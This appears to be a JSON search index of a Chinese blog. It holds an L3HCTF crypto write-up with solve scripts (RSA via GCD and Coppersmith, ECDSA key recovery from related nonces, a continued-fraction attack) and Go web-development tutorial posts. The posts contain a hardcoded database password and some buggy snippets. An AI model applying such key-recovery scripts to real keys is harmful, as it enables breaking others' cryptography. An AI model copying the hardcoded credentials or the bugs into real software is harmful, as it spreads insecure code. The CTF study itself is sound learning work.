[{"categories":["CTF"],"content":"前言 密码这次真的简单吧xd，当作记录帖子了 ","date":"2025-07-15","objectID":"/l3hctf-wp/:1:0","tags":["crypto"],"title":"L3HCTF Wp","uri":"/l3hctf-wp/"},{"categories":["CTF"],"content":"题目 ","date":"2025-07-15","objectID":"/l3hctf-wp/:2:0","tags":["crypto"],"title":"L3HCTF Wp","uri":"/l3hctf-wp/"},{"categories":["CTF"],"content":"math_problem task.py import gmpy2 from gmpy2 import * from Crypto.Util.number import * from random import randint from gmpy2 import invert from scret import flag def myfunction(num): output = 0 output=num**3 return output if __name__ == '__main__': flag_len = len(flag) p, q = getPrime(512), getPrime(512) while True: r = getPrime(512) R = bytes_to_long(str(r).encode()) if isPrime(R): break n = p * q * r hint1 = R * r mod = myfunction(n) hint2 = pow(3*n+1, p % (2 ** 400), mod) m = bytes_to_long(flag) c = pow(m, 65537, n) print('All data:') print(f'n = {n}') print(f'c = {c}') print(f'hint1 = {hint1}') print(f'hint2 = {hint2}') 非预期 GCD把r求出来，然后直接求解 n = c = hint1 = hint2 = from Crypto.Util.number import * r=GCD(hint1,n) print(long_to_bytes(pow(c,inverse(65537,r-1),r))) 预期解 p这里在hint2可以通过二项式定理求出低位 $$ hint_2=1+p_l*3n+\\frac{p_l(p_l-1)}{2}(3n)^2 \\mod n^3\\\\ hint_2=1+p_l*3n \\mod n^2 \\\\ p_l=\\frac{hint_2 \\mod n^2 -1}{3n} $$然后打copper就行了 from sage.all import* from Crypto.Util.number import * n = c = hint1 = hint2 = r = GCD(n, hint1) pl = (hint2 % (n^2) - 1) // (3 * n) R.\u003cx\u003e = Zmod(n//r)[] f = x * 2^400 + pl f = f.monic() ph = f.small_roots(X=2^112, beta=0.4)[0] p = ZZ(ph * 2^400 + pl) q = n // (p * r) phi = (p - 1) * (q - 1) * (r - 1) d = inverse(65537, phi) m = pow(c, d, n) print(long_to_bytes(m)) ","date":"2025-07-15","objectID":"/l3hctf-wp/:2:1","tags":["crypto"],"title":"L3HCTF Wp","uri":"/l3hctf-wp/"},{"categories":["CTF"],"content":"EzECDSA task.py import hashlib import random from ecdsa import NIST256p, SigningKey class FlawedNonceGenerator: def __init__(self, n): self.n = n self.a = random.randrange(1, n) self.b = random.randrange(1, n) self.c = random.randrange(1, n) self.last_k = random.randrange(1, n) def generate_nonce(self): current_k = self.last_k next_k = (self.a * current_k**2 + self.b * current_k + self.c) % self.n self.last_k = next_k return current_k curve = NIST256p n = curve.order private_key = SigningKey.from_secret_exponent(random.randrange(1, n), curve=curve) d = private_key.privkey.secret_multiplier public_key = private_key.get_verifying_key() messages = [ b\"Hello player, welcome to L3HCTF 2025!\", b\"This is a crypto challenge, as you can probably tell.\", b\"It's about ECDSA, a very... robust algorithm.\", b\"I'm sure there are no implementation flaws whatsoever.\", b\"Anyway, here are your signatures. Good luck!\", f\"Oh, and the flag is L3HCTF{{{d}}}. Don't tell anyone!\".encode(), ] nonce_generator = FlawedNonceGenerator(n) f = open('signatures.txt', 'w') for i in range(6): k = nonce_generator.generate_nonce() message = messages[i] h = int.from_bytes(hashlib.sha256(message).digest(), 'big') R = k * curve.generator r = R.x() % n s_inv = pow(k, -1, n) s = (s_inv * (h + d * r)) % n f.write(f\"h: {h}, r: {r}, s: {s}\\n\") gemini可以一把梭，主要就是矩阵解一下？ import hashlib n = 115792089210356248762697446949407573529996955224135760342422259061068512044369 signatures_text = \"\"\" \"\"\" lines = signatures_text.strip().split('\\n') signatures = [] for line in lines: parts = line.split(', ') h = Integer(parts[0].split(': ')[1]) r = Integer(parts[1].split(': ')[1]) s = Integer(parts[2].split(': ')[1]) signatures.append({'h': h, 'r': r, 's': s}) R = GF(n) P.\u003cd\u003e = PolynomialRing(R) u_vals, v_vals = [], [] for sig in signatures[:5]: h, r, s = R(sig['h']), R(sig['r']), R(sig['s']) s_inv = s.inverse() u_vals.append(s_inv * h) v_vals.append(s_inv * r) k = [u_vals[i] + v_vals[i] * d for i in range(5)] M_data = [[k[i]**2, k[i], R(1), k[i+1]] for i in range(4)] M = Matrix(P, M_data) det_poly = M.determinant() roots = det_poly.roots() print(roots) ","date":"2025-07-15","objectID":"/l3hctf-wp/:2:2","tags":["crypto"],"title":"L3HCTF Wp","uri":"/l3hctf-wp/"},{"categories":["CTF"],"content":"RRRSSSAAA task.sage from sage.all import * from secret import flag def generate_vulnerable_key(bits=1024): p_bits = bits // 2 q_bits = bits - p_bits while True: p = random_prime(2**(p_bits), lbound=2**(p_bits-1)) q = random_prime(2**(q_bits), lbound=2**(q_bits-1)) if p != q and p \u003e q and p \u003c 2*q: break N = p * q phi = (p**4 - 1) * (q**4 - 1) d_bits = 1024 d_bound = 2**d_bits while True: d_small = randint(2, d_bound) d = phi - d_small if gcd(d, phi) == 1: if d_small.bit_length() == 1021: break e = inverse_mod(d, phi) return N, e def encrypt(m, N, e): n = 4 r = 2 R = Integers(N) P = PolynomialRing(R, 't') t = P.gen() Q = P.quotient(t**n - r) m_poly = Q([m, 0, 0, 0]) c_poly = m_poly ** e return c_poly.lift() if __name__ == \"__main__\": N, e = generate_vulnerable_key() m = int.from_bytes(flag, 'big') c = encrypt(m, N, e) print(f\"N = {N}\") print(f\"e = {e}\") print(f\"c = {c}\") 打连分数求出d的xd，分母位长度是1021位，校验一下，然后爆破每一个d，然后转成flag判断头 from sage.all import * from Crypto.Util.number import * N = e = c = nn = N**4 alpha = e / nn cf = continued_fraction(alpha) convergents = cf.convergents() for conv in convergents: k_candidate = conv.numerator() d_small_candidate = conv.denominator() if d_small_candidate \u003e= 2**1020 and d_small_candidate \u003c 2**1021: try: c_inv = inverse(c, N) m = pow(c_inv, d_small_candidate, N) flag = long_to_bytes(m) if b'L3HCTF{' in flag: print(\"Flag found:\", flag) break except: continue else: print(\"fuck\") ","date":"2025-07-15","objectID":"/l3hctf-wp/:2:3","tags":["crypto"],"title":"L3HCTF Wp","uri":"/l3hctf-wp/"},{"categories":["golang"],"content":"study golang / demo5 后端：mongodb+gorm+MVC+gin+air 前端：vue+vite+ts 仓库：https://github.com/LTX-GOD/study-golang-demo ","date":"2025-07-08","objectID":"/study-golang3/:1:0","tags":["开发","study"],"title":"Study Golang「3」","uri":"/study-golang3/"},{"categories":["golang"],"content":"项目架构 demo5/ ├── main.go ├── .air.toml ├── ecommerce-sys ├── go.mod ├── go.sum ├── controllers/ │ ├── address.go │ ├── cart.go │ └── controllers.go ├── database/ │ ├── cart.go │ └── databasesetup.go ├── middleware/ │ └── middleware.go ├── models/ │ └── models.go ├── routes/ │ └── routes.go ├── tokens/ │ └── tokengen.go ├── tmp/ │ ├── build-errors.log │ └── main └── static/ ├── form.html └── index.html 关于Air包 go install github.com/air-verse/air@latest //拉包 air init //初始化 air //启动热重载 关于mongodb 这里本地包docker上去的 docker exec -it mongodb sh use gotest ","date":"2025-07-08","objectID":"/study-golang3/:1:1","tags":["开发","study"],"title":"Study Golang「3」","uri":"/study-golang3/"},{"categories":["golang"],"content":"关于后端项目 router \u0026 main 路由文件中我只存了关于用户的，其他的存在了main.go里面，原因是这个练手项目的作者第一开始没写完，我后面自己补完的，包括前端的内容。 然后在main里面，我没有把端口写死，选择环境变量注入的方法 // 获取环境变量PORT的值, 如果不存在则赋值8000 port := os.Getenv(\"PORT\") if port == \"\" { port = \"8000\" } 这样的好处是包docker的时候灵活一点 因为项目是前后端分离，加上前端后还需要解决跨域问题 // 配置CORS config := cors.DefaultConfig() config.AllowOrigins = []string{\"http://localhost:5173\", \"http://localhost:3000\", \"http://localhost:8080\"} config.AllowMethods = []string{\"GET\", \"POST\", \"PUT\", \"DELETE\", \"OPTIONS\"} config.AllowHeaders = []string{\"Origin\", \"Content-Type\", \"Accept\", \"Authorization\", \"X-Requested-With\", \"token\"} config.AllowCredentials = true router.Use(cors.New(config)) models 这里定义的有点多 type User struct { ID primitive.ObjectID `json:\"_id\" bson:\"_id\"` Name *string `json:\"name\" validate:\"required,min=6,max=30\"` Password *string `json:\"password\" validate:\"required,min=6,max=30\"` Email *string `json:\"email\" validate:\"email,required\"` Phone *string `json:\"phone\" validate:\"required\"` Token *string `json:\"token\" ` Refresh_Token *string `json:\"refresh_token\"` Created_At time.Time `json:\"created_at\"` Updated_At time.Time `json:\"updated_at\"` User_ID string `json:\"user_id\"` // 切片本身已经是一个引用类型，能够提供对底层数据的引用，因此不加*号 UserCart []ProductUser `json:\"usercart\" bson:\"usercart\"` Address_Details []Address `json:\"address\" bson:\"address\"` Order_Status []Order `json:\"order\" bson:\"order\"` } type Product struct { Product_ID primitive.ObjectID `json:\"_id\" bson:\"_id\"` Product_Name *string `json:\"product_name\"` Price *string `json:\"price\"` Rating *string `json:\"rating\"` Image *string `json:\"image\"` } type ProductUser struct { Product_ID primitive.ObjectID `json:\"_id\" bson:\"_id\"` Product_Name *string `json:\"product_name\"` Price *string `json:\"price\"` Rating *string `json:\"rating\"` Image *string `json:\"image\"` } type Address struct { Address_id primitive.ObjectID `bson:\"_id\"` House *string `json:\"house_name\" bson:\"house_name\"` Street *string `json:\"street_name\" bson:\"street_name\"` City *string `json:\"city_name\" bson:\"city_name\"` PostalCode *string `json:\"postalcode\" bson:\"postalcode\"` } type Order struct { Order_ID primitive.ObjectID `bson:\"_id\"` Order_Cart []ProductUser `json:\"order_list\" bson:\"order_list\"` Ordered_At time.Time `json:\"ordered_at\" bson:\"ordered_at\"` Price int `json:\"price\" bson:\"price\"` Discount *int `json:\"discount\" bson:\"discount\"` Payment_Method Payment `json:\"payment_method\" bson:\"payment_method\"` } type Payment struct { Digital bool COD bool } 结构体中字段为什么是首字母大写 在go中，首字母大写的含义是这些字段是导出的，可以在包外部访问，就有点像其他语言中的public 加入首字母小写，就类似private，在外部无权限访问 结构体中json和bson的不同 json 标签：用于指定当结构体字段被序列化为 JSON 时，使用的字段名。例如： type User struct { Name string `json:\"name\"` } 即使定义的是Name，在json输出中也会被序列化成name bson 标签：用于指定当结构体字段被序列化为 BSON（MongoDB 的文档格式）时，使用的字段名。例如： type User struct { ID primitive.ObjectID `bson:\"_id\"` } 这个例子中，ID 字段会被映射到 MongoDB 文档的 _id 字段，这是 MongoDB 中常用的主键字段名。 database 这里分成两个文件进行编写，分别是databasesetup.go和cart.go databasesetup.go 主要用来处理数据库连接还有获取用户和产品的集合，稍微多加的一点就是写了个连接数据库时的超时限制，其他的都是很简单的内容 ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second) defer cancel() cart.go 这里先定义了一些报错，然后写业务逻辑 主要任务有： 将指定产品添加到用户的购物车 从用户购物车中移除指定产品 处理用户购物车的购买过程 立即购买 代码太长就不放了bro controllers 这里写的也比较乱 controllers.go：处理密码哈希、注册、密码校验、登录、添加商品、购物车逻辑(增、删、查、购买、下单) cart.go：提供接口处理功能，比如加购物车、移除商品、查看购物车、下单等，也就是main.go哪里的api接口 addre.go：提供用户地址接口，实现增加、编辑、删除的功能 代码很多，就不放了，部分还不是特别完善，像后面两个都是自己实现的，比较潦草 middleware 这里主要用来实现中间件鉴权 func Authentication() gin.HandlerFunc { return func(c *gin.Context) { ClientToken := c.Request.Header.Get(\"token\") if ClientToken == \"\" { c.JSON(http.StatusInternalServerError, gin.H{\"error\": \"No authorization header founded\"}) c.Abort() return } claims, err := token.ValidateToken(ClientToken) if err != \"\" { c.JSON(http.StatusInternalServerError, gin.H{\"error\": err}) c.Abort() return } c.Set(\"email\", claims.Email) c.Set(\"uid\", claims.Uid) c.Next() } } tokens 生成jwttoken type SignedDetails struct { Email string Name string Uid string jwt.StandardClaims } // UserData 是存储用户数据的 MongoDB 集合引用 var UserData *mongo.Col","date":"2025-07-08","objectID":"/study-golang3/:1:2","tags":["开发","study"],"title":"Study Golang「3」","uri":"/study-golang3/"},{"categories":["golang"],"content":"study golang / demo6 后端：mysql+redis+gorm+MVC+gin+air+viper 前端：vue+vite+ts 仓库：https://github.com/LTX-GOD/study-golang-demo ","date":"2025-07-08","objectID":"/study-golang3/:2:0","tags":["开发","study"],"title":"Study Golang「3」","uri":"/study-golang3/"},{"categories":["golang"],"content":"项目架构 demo6/ ├── main.go ├── .air.toml ├── go.mod ├── go.sum ├── readme.md ├── config/ │ ├── config.go │ ├── config.yml │ ├── db.go │ └── redis.go ├── controllers/ │ ├── article_controller.go │ ├── auth_controller.go │ ├── exchange_rate_controller.go │ └── like_controller.go ├── global/ │ └── global.go ├── middlewares/ │ └── auth_middleware.go ├── models/ │ ├── article.go │ ├── exchange_rate.go │ └── user.go ├── routes/ │ └── routes.go ├── utils/ │ └── utils.go └── tmp/ redis \u0026\u0026 mysql 这边都用docker去启动，然后先不建库，后面都现场用 ","date":"2025-07-08","objectID":"/study-golang3/:2:1","tags":["开发","study"],"title":"Study Golang「3」","uri":"/study-golang3/"},{"categories":["golang"],"content":"关于后端项目 编写习惯 这里用viper编写资源管理项 写路由，并且定义每个地方的函数 写数据库models层 写数据库配置文件，mysql和redis 写config.go 写utils和middlewares 关于viper app: name: CurrencyExchangeApp port: \":8000\" database: dsn: root:password@tcp(127.0.0.1:3306)/gotest?charset=utf8mb4\u0026parseTime=True\u0026loc=Local MaxIdleConns: 11 MaxOpenCons: 114 redis: addr: localhost:6379 DB: 0 Password: \"\" 这里去定义端口、数据库连接还有数量 在config.go里面，把这个viper的规则引入 viper.SetConfigName(\"config\") viper.SetConfigType(\"yml\") viper.AddConfigPath(\"./config\") global.go的作用 这个的作用是让这个全局文件都可以访问数据库和redis，在其他的项目中也经常使用这种方法 package global import ( \"github.com/go-redis/redis\" \"gorm.io/gorm\" ) var ( Db *gorm.DB RedisDB *redis.Client ) 关于routes.go 这里稍微的严谨了一点，登录和注册是不用token判断的，但是其他的接口都需要，这样就更加规范了 auth := r.Group(\"/api/auth\") { auth.POST(\"/login\", controllers.Login) auth.POST(\"/register\", controllers.Register) } api := r.Group(\"/api\") api.GET(\"/exchangeRates\", controllers.GetExchangeRates) api.Use(middlewares.AuthMiddleWare()) { api.POST(\"/exchangeRates\", controllers.CreateExchangeRate) api.POST(\"/articles\", controllers.CreateArticle) api.GET(\"/articles\", controllers.GetArticles) api.GET(\"/articles/:id\", controllers.GetArticleByID) api.POST(\"/articles/:id/like\", controllers.LikeArticle) api.GET(\"/articles/:id/like\", controllers.GetArticleLikes) } return r ","date":"2025-07-08","objectID":"/study-golang3/:2:2","tags":["开发","study"],"title":"Study Golang「3」","uri":"/study-golang3/"},{"categories":["golang"],"content":"study golang / demo3 mysql+gorm+MVC ","date":"2025-07-08","objectID":"/study-golang2/:1:0","tags":["开发","study"],"title":"Study Golang「2」","uri":"/study-golang2/"},{"categories":["golang"],"content":"项目架构 D:. ├─ go.mod ├─ go.sum │ ├─cmd │ └─main │ main.go │ └─pkg ├─config │ app.go │ ├─controllers │ book-controller.go │ ├─models │ book.go │ ├─routes │ bookstore-routes.go │ └─utils utils.go 这里直接按照mvc思想去编写了，互相引用比较多，可以初始化规范一点了go mod init github.com/your_username/go-bookstore，但是我比较懒，所以就没有这样( ","date":"2025-07-08","objectID":"/study-golang2/:1:1","tags":["开发","study"],"title":"Study Golang「2」","uri":"/study-golang2/"},{"categories":["golang"],"content":"整体代码 1. 编写 routes/routes.go 文件 先把接口定义好，这样后面就知道要写什么了 package routes import ( \"zsm/pkg/controllers\" \"github.com/gorilla/mux\" ) var RegisterBookStoreRoutes = func(router *mux.Router) { // 将 /book/ 路径和 POST 方法映射到 controllers.CreateBook 函数。 // 也就是说，当一个 POST 请求发送到 /book/ 时，controllers.CreateBook 函数将被调用来处理这个请求。 router.HandleFunc(\"/book/\", controllers.CreateBook).Methods(\"POST\") router.HandleFunc(\"/book/\", controllers.GetBook).Methods(\"GET\") router.HandleFunc(\"/book/{BookId}\", controllers.GetBookById).Methods(\"GET\") router.HandleFunc(\"/book/{BookId}\", controllers.UpdateBook).Methods(\"PUT\") router.HandleFunc(\"/book/{BookId}\", controllers.DeleteBook).Methods(\"DELETE\") } 2. 编写 config/app.go 文件 这里提前建个库 CREATE DATABASE gotest CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; package config import ( \"fmt\" \"github.com/jinzhu/gorm\" _ \"github.com/jinzhu/gorm/dialects/mysql\" ) var ( db *gorm.DB ) func Connect() { d, err := gorm.Open(\"mysql\", \"root:mnbvcxz123321.@tcp(127.0.0.1:3306)/gotest?chartset=utf8\u0026parseTime=True\u0026loc=Local\") if err != nil { panic(err) } fmt.Println(\"Connect to database successfully\") db = d } func GetDB() *gorm.DB { return db } 有一说一，感觉gorm没有nodejs那边的orm好用 3. 编写 utils/utils.go 文件 这里的函数一般用来代码复用/解藕逻辑/统一格式，放的一般是常用的，小而通用的函数 package utils import ( \"encoding/json\" \"io\" \"net/http\" ) func ParseBody(r *http.Request, x interface{}) { if body, err := io.ReadAll(r.Body); err == nil { if err := json.Unmarshal([]byte(body), x); err != nil { return } } } 4. 编写 models/models.go 文件 这里有个小东西，在定义结构体时，嵌套 gorm.Model 结构体，它包含了默认的字段：ID（主键）、CreatedAt、UpdatedAt 和 DeletedAt（软删除）。 在go包初始化时init函数会自动执行，所以我们可以在这个时候连接/初始化数据库 package models import ( \"zsm/pkg/config\" \"github.com/jinzhu/gorm\" ) var db *gorm.DB type Book struct { gorm.Model Name string `json:\"name\"` Author string `json:\"author\"` Publication string `json:\"publication\"` } func init() { config.Connect() db = config.GetDB() // 使用 GORM 的 AutoMigrate 方法自动迁移 Book 结构体。 // 自动迁移会创建或更新数据库表，使其与 Book 结构体匹配。如果表不存在，则创建表；如果表已存在，则更新表结构以匹配 Book 结构体的定义。 db.AutoMigrate(\u0026Book{}) } // CreateBook 方法用于创建 Book 结构体的实例并插入到数据库中。 func (b *Book) CreateBook() *Book{ db.NewRecord(b) db.Create(\u0026b) return b } // GetAllBooks 方法用于从数据库中获取所有 Book 结构体的实例。 func GetAllBooks() []Book { var Books []Book db.Find(\u0026Books) return Books } // GetBookById 方法用于从数据库中获取指定 ID 的 Book 结构体的实例。 func GetBookById(Id int64) (*Book, *gorm.DB) { var getBook Book db:=db.Where(\"ID=?\", Id).Find(\u0026getBook) return \u0026getBook, db } // DeleteBook 方法用于从数据库中删除指定 ID 的 Book 结构体的实例。 func DeleteBook(ID int64) Book { var book Book db.Where(\"ID=?\", ID).Delete(book) return book } 5. 编写 main.go 文件 这里其实就是最起初的启动项了，绑定端口还有创建路由即可 package main import ( \"log\" \"net/http\" \"zsm/pkg/routes\" \"github.com/gorilla/mux\" _ \"github.com/jinzhu/gorm/dialects/mysql\" ) func main() { r := mux.NewRouter() routes.RegisterBookStoreRoutes(r) http.Handle(\"/\", r) log.Fatal(http.ListenAndServe(\"localhost:9010\", r)) } 编写 book-controller.go 文件 就是传统的controllers层罢了 package controllers import ( \"encoding/json\" \"fmt\" \"net/http\" \"strconv\" \"zsm/pkg/models\" \"zsm/pkg/utils\" \"github.com/gorilla/mux\" ) var NewBook models.Book func GetBook(w http.ResponseWriter, r *http.Request) { newBooks := models.GetAllBooks() res, _ := json.Marshal(newBooks) w.Header().Set(\"Content-Type\", \"pkglication/json\") w.WriteHeader(http.StatusOK) w.Write(res) } // GetBookById 根据书籍ID获取书籍详情 // 通过URL路径参数获取书籍ID，然后调用models包中的GetBookById函数获取书籍详情， // 最后将书籍详情以JSON格式返回给客户端。 func GetBookById(w http.ResponseWriter, r *http.Request) { vars := mux.Vars(r) bookId := vars[\"bookId\"] ID, err := strconv.ParseInt(bookId, 0, 0) if err != nil { fmt.Println(\"error write parsing\") } bookDetails, _ := models.GetBookById(ID) res, _ := json.Marshal(bookDetails) w.Header().Set(\"Content-Type\", \"pkglication/json\") w.WriteHeader(http.StatusOK) w.Write(res) } // CreateBook 创建新的书籍记录 // 解析请求体中的书籍信息，然后调用models包中的CreateBook方法创建新的书籍记录， // 最后将创建结果以JSON格式返回给客户端。 // 注意：这里假设models.Book结构体有一个CreateBook()方法来处理创建逻辑。 func CreateBook(w http.ResponseWriter, r *http.Request) { CreateBoo","date":"2025-07-08","objectID":"/study-golang2/:1:2","tags":["开发","study"],"title":"Study Golang「2」","uri":"/study-golang2/"},{"categories":["golang"],"content":"study golang / demo4 mysql+gorm+MVC+gin ","date":"2025-07-08","objectID":"/study-golang2/:2:0","tags":["开发","study"],"title":"Study Golang「2」","uri":"/study-golang2/"},{"categories":["golang"],"content":"项目架构 . ├─ go.mod ├─ go.sum │ ├─ cmd │ └─ main │ └─ main.go │ └─ pkg ├─ config │ └─ app.go │ ├─ controllers │ └─ book-controller.go │ ├─ models │ └─ book.go │ └─ routes └─ bookstore-routes.go 数据库还是用上一个，比较懒导致的 ","date":"2025-07-08","objectID":"/study-golang2/:2:1","tags":["开发","study"],"title":"Study Golang「2」","uri":"/study-golang2/"},{"categories":["golang"],"content":"整体代码 1. 编写 routes/routes.go 文件 因为所有操作都从请求接口开始，定义好路由可以帮助我们明确应用的整体结构。 在路由确定之后，我们可以进一步编写控制器和模型，这样可以确保应用的各个部分都能协调工作。 虽然每个人的开发习惯和业务逻辑可能不同，但从路由入手通常是一个推荐的方法，它能帮助你更清晰地组织代码, 并且让你曾经觉得难以完成的独立开发一个项目变得轻松可行。 package routes import ( \"github.com/gin-gonic/gin\" \"github.com/zsm/go-bookstore/pkg/controllers\" ) func Router() *gin.Engine { r := gin.Default() book := r.Group(\"/book\") { book.GET(\"/\", controllers.GetBookTest) book.GET(\"/:bookId\", controllers.GetBookByIdTest) book.POST(\"/\", controllers.CreateBookTest) book.PUT(\"/:bookId\", controllers.UpdateBookTest) book.DELETE(\"/:bookId\", controllers.DeleteBookTest) } return r } 2. 编写config/app.go 文件 package config import ( \"fmt\" \"github.com/jinzhu/gorm\" _ \"github.com/jinzhu/gorm/dialects/mysql\" ) var ( db *gorm.DB ) func Connect() { d, err := gorm.Open(\"mysql\", \"root:mnbvcxz123321.@tcp(127.0.0.1:3306)/gotest?chartset=utf8\u0026parseTime=True\u0026loc=Local\") if err != nil { panic(err) } fmt.Println(\"Connect to database successfully\") db = d } func GetDB() *gorm.DB { return db } 3. models/models.go 这里其实和demo3差不多，这里要稍微注意一点，查询的时候要写入ID=?，这样去防止sql注入 package models import ( \"github.com/jinzhu/gorm\" \"github.com/zsm/go-bookstore/pkg/config\" ) var db *gorm.DB type Book struct { gorm.Model Name string `json:\"name\"` Author string `json:\"author\"` Publication string `json:\"publication\"` } func init() { config.Connect() db = config.GetDB() db.AutoMigrate(\u0026Book{}) } func (b *Book) CreateBook() *Book { db.NewRecord(b) db.Create(\u0026b) return b } func GetAllBooks() []Book { var Books []Book db.Find(\u0026Books) return Books } func GetBookById(Id int64) (*Book, *gorm.DB) { var getBook Book db := db.Where(\"ID=?\", Id).Find(\u0026getBook) return \u0026getBook, db } func DeleteBook(ID int64) Book { var book Book db.Where(\"ID=?\", ID).Delete(\u0026book) return book } 4. 编写 mian.go 文件 这里就很简洁了，两行搞定bro package main import ( \"fmt\" \"github.com/zsm/go-bookstore/pkg/routes\" ) func main() { r := routes.Router() fmt.Println(\"Server is running on localhost:9010\") r.Run(\":9010\") } 5. 编写 controllers/controller.go 文件 package controllers import ( \"fmt\" \"net/http\" \"strconv\" \"github.com/gin-gonic/gin\" \"github.com/zsm/go-bookstore/pkg/models\" ) // NewBook 是一个用来创建新书的结构体 var NewBook models.Book // GetBookTest 函数返回所有的书籍 func GetBookTest(c *gin.Context) { newBooks := models.GetAllBooks() c.JSON(http.StatusOK, newBooks) } // GetBookByIdTest 函数返回指定ID的书籍 func GetBookByIdTest(c *gin.Context) { bookId := c.Param(\"bookId\") ID, _ := strconv.ParseInt(bookId, 0, 0) bookDetails, _ := models.GetBookById(ID) // 以JSON格式返回书籍详情 c.JSON(http.StatusOK, bookDetails) } // CreateBookTest 函数创建一个新的书籍并返回详细信息 func CreateBookTest(c *gin.Context) { // 初始化一个新书籍结构体 var CreateBook = \u0026models.Book{} // 从请求体中解析书籍信息 c.ShouldBindJSON(CreateBook) // 创建书籍并保存到数据库 b := CreateBook.CreateBook() // 以JSON格式返回书籍详情 c.JSON(http.StatusOK, b) } func DeleteBookTest(c *gin.Context) { bookId := c.Param(\"bookId\") ID, err := strconv.ParseInt(bookId, 0, 0) if err != nil { fmt.Printf(\"解析错误！\") } // 删除之前获取书籍详情, 并删除书籍 book, _ := models.GetBookById(ID) models.DeleteBook(ID) c.JSON(http.StatusOK, book) } func UpdateBookTest(c *gin.Context) { var updateBook = \u0026models.Book{} c.ShouldBindJSON(updateBook) bookId := c.Param(\"bookId\") ID, err := strconv.ParseInt(bookId, 0, 0) if err != nil { fmt.Println(\"解析错误！\") } bookDetails, db := models.GetBookById(ID) // 如果Name、Author、Publication字段有更新，则更新数据库对应数据 if updateBook.Name != \"\" { bookDetails.Name = updateBook.Name } if updateBook.Author != \"\" { bookDetails.Author = updateBook.Author } if updateBook.Publication != \"\" { bookDetails.Publication = updateBook.Publication } // 保存更新后的书籍信息到数据库 db.Save(\u0026bookDetails) c.JSON(http.StatusOK, bookDetails) } ","date":"2025-07-08","objectID":"/study-golang2/:2:2","tags":["开发","study"],"title":"Study Golang「2」","uri":"/study-golang2/"},{"categories":["golang"],"content":"study golang / demo1 作为一个初学者，跟着佬的步伐写五个小demo玩玩，熟悉一下整个的开发方式和流程 ","date":"2025-07-07","objectID":"/study-golang1/:1:0","tags":["开发","study"],"title":"Study golang「1」","uri":"/study-golang1/"},{"categories":["golang"],"content":"项目架构 . ├── main.go └── static ├── form.html └── index.html 最初级的东西了，这里不用gin练练代码，静态文件就不写了，自由发挥了bro ","date":"2025-07-07","objectID":"/study-golang1/:1:1","tags":["开发","study"],"title":"Study golang「1」","uri":"/study-golang1/"},{"categories":["golang"],"content":"整体代码 先初始化一下，这里就一个go文件，所以随便了go mod init zsm main.go package main import ( \"fmt\" \"log\" \"net/http\" ) func formHandler(w http.ResponseWriter, r *http.Request) { // w 为 http.ResponseWriter 的实例，用于向客户端返回响应。 // r 为 http.Request 的实例，包含了客户端的请求信息。 err := r.ParseForm() if err != nil { fmt.Println(w, \"ParseForm() err:%v\", err) return } fmt.Fprintln(w, \"POST request successful\") name := r.FormValue(\"name\") address := r.FormValue(\"address\") fmt.Fprintf(w, \"Name=%s\\n\", name) fmt.Fprintf(w, \"address=%s\\n\", address) } func helloHandler(w http.ResponseWriter, r *http.Request) { //请求路径 if r.URL.Path != \"/hello\" { http.Error(w, \"404 not found\", http.StatusNotFound) return } //请求方法 if r.Method != \"GET\" { http.Error(w, \"method is not supported\", http.StatusNotFound) return } fmt.Fprintf(w, \"Hello\") } func main() { fileServer := http.FileServer(http.Dir(\"./static\")) //挂载静态文件 http.Handle(\"/\", fileServer) //挂载到根目录 //路径绑定函数 http.HandleFunc(\"/form\", formHandler) http.HandleFunc(\"/hello\", helloHandler) fmt.Println(\"server is running on 8080\") err := http.ListenAndServe(\":8080\", nil) if err != nil { log.Fatal(err) } } 原生http模块比较麻烦算是，练练熟练度就行了 ","date":"2025-07-07","objectID":"/study-golang1/:1:2","tags":["开发","study"],"title":"Study golang「1」","uri":"/study-golang1/"},{"categories":["golang"],"content":"关于指针传递 比较好玩的是在go里面*是用来声明以及操作指针的，而\u0026是一个运算符，它用于获取（或查找）变量的地址。比如 func handleRequest(r *http.Request) { } 这里r赋值为后面的指针，那我要访问后再说解析的时候，就可以直接在上面进行操作了，比如 func modifyHeader(r *http.Request) { r.Header.Set(\"X-Custom-Header\", \"Value\") // 修改请求头 } 这样的好处是如果http.Request是一个大结构体，传指针可以减少内存使用还有复制开销，也避免了将整个结构体复制到函数调用栈，有效提高性能 那我怎么获取实际对象呢，直接解引用就行了，即*r 这样的好处不仅仅在性能优化上，也为开发者提供了一种一致的编程模式，在一定程度上有利于规范化 ","date":"2025-07-07","objectID":"/study-golang1/:1:3","tags":["开发","study"],"title":"Study golang「1」","uri":"/study-golang1/"},{"categories":["golang"],"content":"study golang / demo2 为降低难度，本项目未使用 DATEBASE ，仅使用本地 json 文件存储数据。 ","date":"2025-07-07","objectID":"/study-golang1/:2:0","tags":["开发","study"],"title":"Study golang「1」","uri":"/study-golang1/"},{"categories":["golang"],"content":"项目架构 . └─src ├─go-basic-server ├─go-code ├─go-keword-scraper ├─go-movies-curd │ go.mod │ go.sum │ main.go │ ├─go-rest ├─go-server └─go-todo 这里没有用数据库，用简单的方法先模拟一下xd ","date":"2025-07-07","objectID":"/study-golang1/:2:1","tags":["开发","study"],"title":"Study golang「1」","uri":"/study-golang1/"},{"categories":["golang"],"content":"整体代码 先写结构体，方便后面的定义全局变量 //电影 type Movie struct { ID string `json:\"id\"` Isbn string `json:\"isbn\"` Title string `json:\"title\"` Director *Director `json:\"director\"` } //导演 type Director struct { FirstName string `json:\"firstname\"` LastName string `json:\"lastname\"` } var movies []Movie 接下来创建路由还有插入几个真数据 func main() { //router r := mux.NewRouter() movies = append(movies, Movie{ID: \"1\", Isbn: \"438227\", Title: \"Movie One\", Director: \u0026Director{FirstName: \"John\", LastName: \"Doe\"}}) movies = append(movies, Movie{ID: \"2\", Isbn: \"45455\", Title: \"Movie Two\", Director: \u0026Director{FirstName: \"Steve\", LastName: \"Smith\"}}) r.HandleFunc(\"/movies\", getMovies).Methods(\"GET\") r.HandleFunc(\"/movies/{id}\", getMovie).Methods(\"GET\") r.HandleFunc(\"/movies\", createMovie).Methods(\"POST\") r.HandleFunc(\"/movies/{id}\", updateMovie).Methods(\"POST\") r.HandleFunc(\"/movies{id}\", deleteMovie).Methods(\"DELETE\") fmt.Println(\"server is running on 8080\") log.Fatal(http.ListenAndServe(\":8080\", r)) } 这里写五个api接口，依次写上去 // 拿全部的电影 func getMovies(w http.ResponseWriter, r *http.Request) { w.Header().Set(\"Content-Type\", \"application/json\") json.NewEncoder(w).Encode(movies) } // 删除指定电影 func deleteMovie(w 